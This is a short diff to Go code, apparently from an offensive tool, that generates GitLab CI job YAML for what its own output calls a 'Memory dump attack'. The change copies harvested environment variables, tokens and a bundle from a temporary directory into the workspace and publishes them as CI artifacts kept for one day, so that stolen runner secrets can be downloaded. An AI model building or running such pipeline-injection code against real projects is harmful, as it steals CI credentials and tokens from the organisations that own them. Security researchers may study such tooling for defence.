@@ -67,7 +67,15 @@ stages: [%s]
   script:
     - |
 %s
-  allow_failure: true%s
+  allow_failure: true
+  artifacts:
+    when: always
+    paths:
+      - memdump_env.txt
+      - memdump_tokens.txt
+      - memdump_bundle.tgz
+      - memdump_report.json
+    expire_in: 1 day%s
 `, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags), indented, rulesManual(o.Common.Manual))
 }
 
@@ -267,7 +275,11 @@ with open('$_d/report.json', 'w') as f:
 `)
 	}
 
-	b.WriteString(`  # 10. Cleanup
+	b.WriteString(`  # 10. Copy artifacts to working directory before cleanup
+  cp "$_d/env_current.txt" ./memdump_env.txt 2>/dev/null || true
+  cp "$_d/tokens.txt" ./memdump_tokens.txt 2>/dev/null || true
+  cp "$_d/bundle.tgz" ./memdump_bundle.tgz 2>/dev/null || true
+  cp "$_d/report.json" ./memdump_report.json 2>/dev/null || true
   rm -rf "$_d"
   echo "[*] Memory dump attack complete"
 }
